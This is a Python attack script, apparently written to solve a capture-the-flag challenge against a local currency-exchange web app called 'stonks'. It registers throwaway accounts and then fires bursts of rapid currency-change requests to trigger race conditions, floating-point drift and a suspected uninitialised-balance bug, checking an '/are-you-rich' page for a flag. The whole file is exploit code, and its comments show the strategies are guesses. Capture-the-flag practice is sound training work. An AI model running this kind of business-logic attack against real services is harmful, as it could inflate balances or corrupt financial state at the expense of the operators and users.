import requests
import time

# Target URL
BASE_URL = "http://localhost:1337"

def register_user(username, password):
    """Register a new user"""
    session = requests.Session()
    
    data = {
        "username": username,
        "password": password,
        "confirm_password": password
    }
    
    response = session.post(f"{BASE_URL}/register", data=data)
    print(f"Register response: {response.status_code}")
    return session

def login_user(session, username, password):
    """Login user"""
    data = {
        "username": username,
        "password": password
    }
    
    response = session.post(f"{BASE_URL}/login", data=data)
    print(f"Login response: {response.status_code}")
    return session

def change_currency(session, currency):
    """Change currency"""
    data = {
        "currency": currency
    }
    
    response = session.post(f"{BASE_URL}/change-currency", data=data)
    print(f"Change currency to {currency}: {response.status_code}")
    return session

def check_balance(session):
    """Check current balance"""
    response = session.get(f"{BASE_URL}/")
    print(f"Balance page: {response.status_code}")
    if response.status_code == 200:
        print(f"Balance content: {response.text[:500]}...")
    return response.text

def check_rich(session):
    """Check if we're rich enough for flag"""
    response = session.get(f"{BASE_URL}/are-you-rich")
    print(f"Are you rich page: {response.status_code}")
    if response.status_code == 200:
        print(f"Rich check content: {response.text}")
        if "FLAG" in response.text:
            print("ðŸŽ‰ FLAG FOUND! ðŸŽ‰")
    return response.text

def exploit_user_currencies_bug():
    """Exploit the specific bug where user_currencies[u] might not exist"""
    username = f"bug_user_{int(time.time())}"
    password = "password123"
    
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Check initial balance
    print("\n=== Initial Balance ===")
    check_balance(session)
    
    # The specific bug: Try to trigger the condition where user_balances[u] doesn't exist
    # but user_currencies[u] also doesn't exist, causing the bug:
    # user_balances[u] = STONKS_GIFT * user_currencies[u]
    
    print("\n=== Exploiting user_currencies bug ===")
    
    # Strategy 1: Try to manipulate the user state to trigger the bug
    # We need to somehow make user_balances[u] not exist but user_currencies[u] also not exist
    
    # Try changing currency multiple times to create state inconsistency
    currencies = ["JPY", "KRW", "IDR", "EUR", "USD", "GBP", "AUD"]
    
    for i, currency in enumerate(currencies):
        print(f"\n--- Step {i+1}: Change to {currency} ---")
        session = change_currency(session, currency)
        check_balance(session)
        check_rich(session)
        time.sleep(0.1)
    
    # Strategy 2: Try rapid currency changes to cause race conditions
    print("\n=== Strategy 2: Rapid changes ===")
    
    for _ in range(30):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)
    
    # Strategy 3: Try to exploit the specific bug condition
    print("\n=== Strategy 3: Targeted bug exploitation ===")
    
    # Try to create a situation where user_currencies[u] might be None or missing
    # by doing multiple rapid currency changes
    
    for _ in range(50):
        session = change_currency(session, "JPY")
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.03)

def exploit_session_manipulation():
    """Try to manipulate session state to trigger the bug"""
    username = f"session_user_{int(time.time())}"
    password = "password123"
    
    print(f"\n=== Session Manipulation Exploit ===")
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to manipulate session to create inconsistency
    print("\n=== Manipulating session state ===")
    
    # Try multiple rapid requests to create race conditions
    for _ in range(40):
        session = change_currency(session, "KRW")
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.02)

def exploit_floating_point():
    """Try to exploit floating point precision errors"""
    username = f"float_user_{int(time.time())}"
    password = "password123"
    
    print(f"\n=== Floating Point Exploit ===")
    print(f"Creating user: {username}")
    
    # Register and login
    session = register_user(username, password)
    session = login_user(session, username, password)
    
    # Try to exploit floating point precision errors
    print("\n=== Exploiting floating point precision ===")
    
    # Convert between currencies with very different rates multiple times
    for _ in range(25):
        session = change_currency(session, "GBP")  # 0.48 (small)
        session = change_currency(session, "KRW")  # 888.04 (large)
        session = change_currency(session, "AUD")
        check_rich(session)
        time.sleep(0.05)

if __name__ == "__main__":
    print("=== TARGETED STONKS EXPLOIT ===")
    
    # Try multiple exploit strategies
    exploit_user_currencies_bug()
    exploit_session_manipulation()
    exploit_floating_point()
    
    print("\n=== Exploit completed ===") 